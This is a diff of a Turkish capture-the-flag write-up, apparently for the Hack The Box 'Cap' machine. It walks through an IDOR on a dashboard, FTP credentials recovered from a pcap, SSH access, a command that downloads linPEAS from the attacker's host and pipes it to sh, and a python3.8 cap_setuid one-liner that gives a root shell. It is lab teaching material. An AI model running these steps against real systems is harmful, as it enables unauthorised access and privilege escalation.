@@ -33,12 +33,16 @@ Açık portlar:
 
 80/tcp - HTTP (Gunicorn web server)
 
+---
+
 🌐 Web Servisi Analizi (Port 80)
 Web arayüzü "Security Dashboard" ile açılıyor.
 "Security Snapshot" işlemi sonrası tarayıcı /data/[id] formatında URL'lere yönlendiriliyor.
 id parametresi değiştirilerek başka kullanıcıların analiz sonuçlarına erişilebildiği tespit edildi.
 Bu, IDOR (Insecure Direct Object Reference) zafiyetidir.
 En fazla kayıt içeren id=0 olarak belirlendi.
+
+---
 
 📂 PCAP Dosyasının İncelenmesi
 /data/0 dizininden indirilen pcap dosyası Wireshark ile incelendi.
@@ -47,17 +51,22 @@ FTP trafiğinden açık olarak iletilen kimlik bilgileri elde edildi:
 Kullanıcı Adı: nathan
 Şifre: Buck3tH4TF0RM3!
 
+---
+
 🔑 Erişim Sağlama
 Bu kimlik bilgileri önce FTP için denendi, işe yaramadı.
 SSH bağlantısı başarılı oldu.
-
-
 ssh nathan@10.10.10.245
+
+
+---
+
 🏴 Kullanıcı Bayrağı (User Flag)
 SSH bağlantısı sonrası kullanıcı bayrağı okundu:
-
-
 cat /home/nathan/user.txt
+
+---
+
 🛠️ Yetki Yükseltme (Privilege Escalation)
 Hedef makine dış dünyadan dosya indirmeye kapalı olduğu için linPEAS betiği saldırgan makinesinde python3 ile HTTP sunucusu açılarak hedefe aktarıldı.
 
@@ -66,9 +75,13 @@ python3 -m http.server 8080
 Hedef makinede indirme ve çalıştırma:
 curl http://10.10.16.34:8080/linpeas.sh | sh
 
+---
+
 ⚙️ Özel Yetkili Binary Tespiti
 linPEAS çıktısında /usr/bin/python3.8 dosyasının cap_setuid yetkisi olduğu görüldü.
 Bu yetki programın setuid çağrısı yaparak etkin kullanıcı kimliğini değiştirmesine izin verir.
+
+---
 
 👑 Root Yetkisi Alımı
 cap_setuid yetkisi sayesinde python3.8 kullanılarak etkin UID root yapılır ve root shell elde edilir.
@@ -77,9 +90,13 @@ cap_setuid yetkisi sayesinde python3.8 kullanılarak etkin UID root yapılır ve
 nathan@cap:~$ /usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash"); '
 root@cap:~#
 
+---
+
 🏴 Root Bayrağı (Root Flag)
 Root shell açıldıktan sonra root bayrağı okunur:
 cat /root/root.txt
+
+---
 
 📋 Özet Tablosu
 Aşama              |	Durum
@@ -91,6 +108,8 @@ Kullanıcı Bayrağı	 | Alındı
 linPEAS Analizi	   | Tamamlandı
 Yetki Yükseltme	   | Başarılı
 Root Bayrağı	     | Alındı
+
+---
 
 🛠️ Kullanılan Araçlar
 nmap
